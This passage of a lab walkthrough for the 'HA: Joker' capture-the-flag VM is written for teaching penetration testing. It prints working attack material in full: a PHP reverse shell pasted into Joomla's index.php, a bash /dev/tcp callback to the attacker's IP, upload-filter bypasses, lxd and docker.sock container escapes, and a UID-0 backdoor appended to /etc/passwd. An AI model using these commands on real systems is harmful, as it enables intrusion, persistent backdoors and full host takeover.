You are logged in as a **Super User**. Joomla, like WordPress, lets
administrators edit PHP files from the browser. That is a *feature*, and it is
why an admin account equals a server.

### 5.1 Navigate to the template

1. Top menu → **Extensions → Templates**.
2. Click the **Templates** tab (not *Styles*).
3. Choose the **`beez3` Details and Files** template.
4. In the file tree on the left, open **`index.php`**.

You are now in a browser-based PHP editor.

### 5.2 Prepare the reverse shell


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Kali
cp /usr/share/webshells/php/php-reverse-shell.php ./joker-shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" joker-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" joker-shell.php
grep -nE '^\$(ip|port)|\$VERSION' joker-shell.php | head
```

```text
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
```

```bash
cat joker-shell.php        # select all, copy
```

**Paste the whole thing over the contents of `index.php` in the Joomla editor,
then click Save.**

> **Why overwrite `index.php` specifically?** Because it is the entry point of
> the template — Joomla renders it for *any* front-end request. So you do not
> need to know or remember the uploaded filename; simply visiting the site's home
> page triggers your shell. Overwriting an obscure include would require you to
> find the exact URL that pulls it in.

### 5.3 Catch the shell

```bash
# Kali
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

Now request the template. The published walkthrough uses the **Template Preview**
button in the Joomla admin; equivalently, from the CLI:

```bash
curl -s "http://192.168.56.111:8080/index.php?templateStyle=1" >/dev/null
```

Your listener fires:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 43210
Linux joker 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:36:02 up 42 min,  0 users,  load average: 0.08, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### 5.4 Upgrade to a TTY


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@joker:/var/www/html$
```

Press `Ctrl+Z`, then on Kali:

```bash
stty raw -echo; fg
```

Back on the target:

```bash
www-data@joker:/var/www/html$ export TERM=xterm
www-data@joker:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@joker:/var/www/html$ whoami
www-data
```

> **Note:** this box has no separate `user.txt` — the objective is a single root
> flag, `final.txt`. Everything from here is privilege escalation.

![Reverse shell caught as www-data](images/06-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 6. Privilege escalation — the `lxd` group

### 6.1 Enumerate: what groups am I in?


> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
>
> ```bash
> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
> ```
>
> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
> There is no nuance: a member can mount the host filesystem or start a privileged
> container, and from there it is a one-line `echo >> /etc/passwd`.
>
> **Why.** Containers share the *host kernel*. A container marked
> `security.privileged=true` does not drop capabilities and runs its init as **real
> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
> Put those together and a low-privileged user says: *start a root container, mount
> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
> left.
>
> ```bash
> # docker — the host root, chrooted into
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # docker.sock — talk to the daemon directly, no CLI needed
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
>
> # lxd — build an image on Kali, carry it over, mount the host
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
> ```
>
> `-c security.privileged=true` is the flag that makes this an escalation rather than
> a sandbox. `source=/` is the host's entire root filesystem.
>
> **Defensive corollary:** never add a web-server or service account to a container
> group. If an application genuinely must launch containers, give it a scoped API
> token in a restricted project — not group membership.
>
> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)

```bash
www-data@joker:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),110(lxd)
```

**`110(lxd)` — that is the whole box.**

> **Why is `lxd` group membership equivalent to root?**
>
> LXD is Ubuntu's system container manager (LXC with a REST API). Members of the
> `lxd` group may create containers. A container can be created
> **`security.privileged=true`** — meaning it does *not* drop capabilities and
> runs its init as **real UID 0 on the host kernel**. And a container can be
> given a **disk device that mounts the host's `/`** at any path inside it.
>
> Put those together and a low-privileged user can say: *"start a root container,
> mount the host filesystem at `/mnt/root`, then edit `/mnt/root/etc/passwd`."*
> There is no isolation left. **`lxd` (and `docker`, and `libvirt`) group
> membership is root-equivalent and must be treated as such.**

Confirm the tooling exists:

```bash
www-data@joker:/var/www/html$ which lxc lxd
/usr/bin/lxc
/usr/bin/lxd

www-data@joker:/var/www/html$ lxc --version
3.0.3

www-data@joker:/var/www/html$ lxc image list
```

```text
+-------+--------------+--------+-------------------------------+--------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |
+-------+--------------+--------+-------------------------------+--------------+
```

> An **empty image list**. The box has LXD but no images, and there is no way to
> `lxc launch images:ubuntu/18.04` without internet access on the lab network.
> **So you must build an image on Kali and carry it across.** That is what
> `lxd-alpine-builder` is for.

Do the standard sweep anyway — never skip it:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
www-data@joker:/var/www/html$ sudo -l
```

```text
Matching Defaults entries for www-data on joker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on joker:
```

Nothing. Check SUID:


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
www-data@joker:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
```

```text
/bin/mount
/bin/ping
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gdb
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

> All stock Ubuntu (`gdb` is mildly interesting but a dead end without a
> SUID-root binary that runs your script). No cron jobs, no writable
> root-owned scripts. **`lxd` is the intended path.**

![id showing lxd group membership](images/07-lxd-group.png)

### 6.2 Build an Alpine image on Kali

Alpine is used because the resulting image is only a few megabytes.

```bash
# Kali
sudo apt install -y git
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

```text
+ DIR=/tmp/tmp.aB3xYz
+ mkdir -p /tmp/tmp.aB3xYz
+ trap 'rm -rf /tmp/tmp.aB3xYz' EXIT
+ cd /tmp/tmp.aB3xYz
+ apk update
fetch https://dl-cdn.alpinelinux.org/alpine/v3.20/main/x86_64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.20/community/x86_64/APKINDEX.tar.gz
v3.20.3-9-g5f3b4e2a1c [https://dl-cdn.alpinelinux.org/alpine/v3.20/main]
OK: 25417 distinct packages available
+ apk add --no-cache bash
(1/4) Installing ncurses-terminfo-base (6.4_p20231125-r0)
(2/4) Installing ncurses-libs (6.4_p20231125-r0)
(3/4) Installing readline (8.2.7-r0)
(4/4) Installing bash (5.2.26-r0)
Executing busybox-1.36.1-r29.trigger
OK: 8 MiB in 19 packages
+ tar -zcf alpine-v3.20-x86_64.tar.gz -C /tmp/tmp.aB3xYz .
+ exit 0
```

```bash
ls -lh *.tar.gz
```

```text
-rw-r--r-- 1 root root 3.1M May 11 12:44 alpine-v3.20-x86_64.tar.gz
```

> **Troubleshooting.** `build-alpine` needs internet access (it downloads the
> Alpine minirootfs) and must be run as root. If your Kali has no network in the
> lab profile, temporarily switch it to NAT, build the image, then switch back.
> If the script fails on a newer Alpine, pin a release:
> `sudo ./build-alpine -a v3.14`.

### 6.3 Transfer it to the target

Serve it from Kali:

```bash
# Kali — in the lxd-alpine-builder directory
python3 -m http.server 80
```

Pull it down on the target:

```bash
www-data@joker:/tmp$ cd /tmp
www-data@joker:/tmp$ wget http://192.168.56.10/alpine-v3.20-x86_64.tar.gz
```

```text
--2024-05-11 12:47:19--  http://192.168.56.10/alpine-v3.20-x86_64.tar.gz
Connecting to 192.168.56.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3219456 (3.1M) [application/x-gzip]
Saving to: 'alpine-v3.20-x86_64.tar.gz'

alpine-v3.20-x86_64.tar.gz  100%[======================>]   3.07M  --.-KB/s    in 0.03s

2024-05-11 12:47:19 (98.4 MB/s) - 'alpine-v3.20-x86_64.tar.gz' saved [3219456/3219456]
```

> If `wget` is absent, `curl -o alpine.tar.gz http://192.168.56.10/alpine-v3.20-x86_64.tar.gz`
> works the same. If neither exists, base64 the file and paste it through the
> existing web shell — slow, but always available.

### 6.4 Import, launch privileged, mount the host

```bash
www-data@joker:/tmp$ lxc image import ./alpine-v3.20-x86_64.tar.gz --alias myimage
```

```text
Image imported with fingerprint: 6c1f2e8a9d4b7c3e5f1a0d9b8c7e6f5a4d3c2b1a0e9f8d7c6b5a4e3d2c1b0a9
```

```bash
www-data@joker:/tmp$ lxc image list
```

```text
+---------+--------------+--------+------------------------------------------+--------------+-----------+----------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION                | ARCHITECTURE |   TYPE    |   SIZE   |          UPLOAD DATE          |
+---------+--------------+--------+------------------------------------------+--------------+-----------+----------+-------------------------------+
| myimage | 6c1f2e8a9d4b | no     | alpine v3.20 (20240511_12:44)            | x86_64       | CONTAINER | 3.07MB   | May 11, 2024 at 9:47am (UTC)  |
+---------+--------------+--------+------------------------------------------+--------------+-----------+----------+-------------------------------+
```

> `--alias myimage` gives the image a human name so you do not have to type a
> 64-character fingerprint. `lxc image list` confirming the alias is your
> checkpoint — if this table is empty, the import failed and nothing after this
> will work.

Now the critical command:

```bash
www-data@joker:/tmp$ lxc init myimage ignite -c security.privileged=true
```

```text
Creating ignite
```

> `-c security.privileged=true` is the flag that makes this an escalation rather
> than a sandbox. It tells LXD **not** to namespace the container's UIDs, so
> processes inside run as **host root**.

Attach the host filesystem as a disk device:

```bash
www-data@joker:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

```text
Device mydevice added to ignite
```

> | Argument | Meaning |
> | --- | --- |
> | `ignite` | The container you just created |
> | `mydevice` | An arbitrary name for this device entry |
> | `disk` | Device type = block/filesystem mount |
> | `source=/` | **The host's entire root filesystem** |
> | `path=/mnt/root` | Where it appears *inside* the container |
> | `recursive=true` | Bind-mount sub-mounts too (`/proc`, `/sys`, `/dev`) |

Start it and get a shell inside:

```bash
www-data@joker:/tmp$ lxc start ignite
www-data@joker:/tmp$ lxc exec ignite /bin/sh
```

```text
~ #
```

> The prompt changed from `www-data@joker:/tmp$` to `~ #`. **You are now root
> inside the container** — and the container can see the host's disk.

### 6.5 Read the host's root directory

```sh
~ # id
uid=0(root) gid=0(root)
~ # ls /mnt/root
~ # ls -la /mnt/root
```

```text
total 100
drwxr-xr-x  23 root root  4096 Oct  8  2019 .
drwxr-xr-x   3 root root  4096 May 11  2024 ..
drwxr-xr-x   2 root root  4096 Oct  8  2019 bin
drwxr-xr-x   3 root root  4096 Oct  8  2019 boot
drwxr-xr-x  18 root root  3560 May 11  2024 dev
drwxr-xr-x  93 root root  4096 May 11  2024 etc
drwxr-xr-x   4 root root  4096 Oct  8  2019 home
lrwxrwxrwx   1 root root    33 Oct  8  2019 initrd.img -> boot/initrd.img-4.15.0-65-generic
drwxr-xr-x   2 root root  4096 Oct  8  2019 lib
drwx------   2 root root 16384 Oct  8  2019 lost+found
drwxr-xr-x   3 root root  4096 Oct  8  2019 media
drwxr-xr-x   2 root root  4096 Oct  8  2019 mnt
drwxr-xr-x   2 root root  4096 Oct  8  2019 opt
dr-xr-xr-x 118 root root     0 May 11  2024 proc
drwx------   4 root root  4096 Oct  8  2019 root
drwxr-xr-x  21 root root   660 May 11  2024 run
drwxr-xr-x   2 root root 12288 Oct  8  2019 sbin
drwxr-xr-x   3 root root  4096 Oct  8  2019 snap
drwxr-xr-x   2 root root  4096 Oct  8  2019 srv
drwxr-xr-x   3 root root  4096 Oct  8  2019 sys
drwxrwxrwt   7 root root  4096 May 11  2024 tmp
drwxr-xr-x  11 root root  4096 Oct  8  2019 usr
drwxr-xr-x  14 root root  4096 Oct  8  2019 var
```

That is the **host's** `/`, mounted at `/mnt/root`. Read the flag:

```sh
~ # cd /mnt/root/root
~ # ls -la
```

```text
total 40
drwx------  4 root root 4096 Oct  8  2019 .
drwxr-xr-x 23 root root 4096 Oct  8  2019 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  160 Oct  8  2019 final.txt
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Oct  8  2019 snap
drwxr-xr-x  2 root root 4096 Oct  8  2019 .ssh
~ # cat final.txt
```

```text
        ██╗ ██████╗ ██╗  ██╗███████╗██████╗
        ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
        ██║██║   ██║█████╔╝ █████╗  ██████╔╝
   ██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
   ╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
    ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

Congratulations! You have rooted HA: Joker.

  flag{Th1s_1s_N0t_Th3_EnD_1ts_0nly_Th3_B3g1nn1ng}

                  — Hacking Articles
```

**Root flag captured.** ✅ 🎉

![final.txt read from /mnt/root/root inside the privileged container](images/08-root-flag.png)

### 6.6 Optional — a real root shell on the host

Reading files through `/mnt/root` is enough for the flag, but if you want a true
interactive root shell on the host (useful for post-exploitation practice), use
the container to plant a backdoor entry:


> ### 📖 Concept — The `/etc/passwd` overwrite trick
>
> Historically Linux stored password hashes in `/etc/passwd` field 2. Today they live
> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```sh
# inside the container
~ # openssl passwd -1 -salt joker pass123
```

```text
$1$joker$r7Xk1mQ9pL2nYwZtBvHcE0
```

> ⚠️ **Always regenerate this hash yourself.** The exact string above depends on
> the OpenSSL version's MD5-crypt implementation and salt handling; copy-pasting
> a hash from any writeup (including this one) is how you end up staring at
> `Authentication failure` with no idea why. The hash must be **22 characters
> after the final `$`**.

```sh
~ # echo 'joker:$1$joker$r7Xk1mQ9pL2nYwZtBvHcE0:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd
~ # tail -3 /mnt/root/etc/passwd
```

```text
joomla:x:1001:1001::/home/joomla:/bin/sh
lxd:x:106:65534::/var/lib/lxd/:/bin/false
joker:$1$joker$r7Xk1mQ9pL2nYwZtBvHcE0:0:0:root:/root:/bin/bash
```

Exit the container and switch:

```sh
~ # exit
www-data@joker:/tmp$ su joker
Password: pass123
root@joker:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@joker:/tmp# cat /root/final.txt
```

> **Clean up after yourself.** This is a lab, but the habit matters:
>
> ```bash
> root@joker:~# lxc stop ignite && lxc delete ignite && lxc image delete myimage
> root@joker:~# rm -f /tmp/alpine-v3.20-x86_64.tar.gz
> root@joker:~# sed -i '/^joker:\$1\$joker\$/d' /etc/passwd
> ```
>
> And restore the `beez3` `index.php` template from the Joomla backup, or the
> site will be broken for the next person who uses the VM.

---

## 7. Alternative paths worth trying

These are not required, but a good pentester enumerates everything.

### 7.1 Joomla administrator panel

`nikto` reported `/administrator/`. Because `:8080` is behind Basic Auth, the
Joomla login is a **second, independent** authentication layer. Try
`joker:hannah` there too — authors frequently reuse the credential.

### 7.2 The Joomla database

Once you have a shell, the database holds every CMS credential:


> ### 📖 Concept — Why CMS config files are such a big deal
>
> A CMS must know how to reach its database on **every single page request**, so its
> config file necessarily contains those credentials **in plaintext**. There is no way
> to avoid that — it is inherent to how the software works.
>
> Three consequences:
>
> 1. **Any local user who can read the web root has the database password.**
> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
>    never get a shell first; you read the config through an LFI and go straight to
>    the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
>
> | Stack | Config file |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel / most Node | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
>
> ```bash
> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
> ```
>
> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
> "read a config file" escalates into "execute operating-system commands as root"
> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
>
> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)

```bash
www-data@joker:/var/www/html$ cat configuration.php | grep -E '^\s*public \$(user|password|db|host)'
```

```php
	public $user = 'joomla';
	public $password = 'hannah';
	public $db = 'joomla';
	public $host = 'localhost';
```

```bash
www-data@joker:/var/www/html$ mysql -u joomla -phannah joomla -e \
  "SELECT username,email FROM #__users;"
```

```text
+----------+-------------------+
| username | email             |
+----------+-------------------+
| joker    | joker@example.com |
+----------+-------------------+
```

> `configuration.php` in Joomla (like `wp-config.php` in WordPress) contains the
> database password in **plaintext**. Reading it is a standard post-exploitation
> step and a standard reason CMS boxes chain into full compromise.

### 7.3 SSH

Port 22 was open the whole time. Once you have `joker:hannah`, try it:

```bash
ssh joker@192.168.56.111
```

If it succeeds you get a stable, fully-interactive shell immediately — much
nicer than the web shell for doing the LXD work. If it fails, the account has no
SSH access (a `/bin/false` shell or no `shadow` entry) and you keep the web
shell.

---

## 8. Summary of vulnerabilities

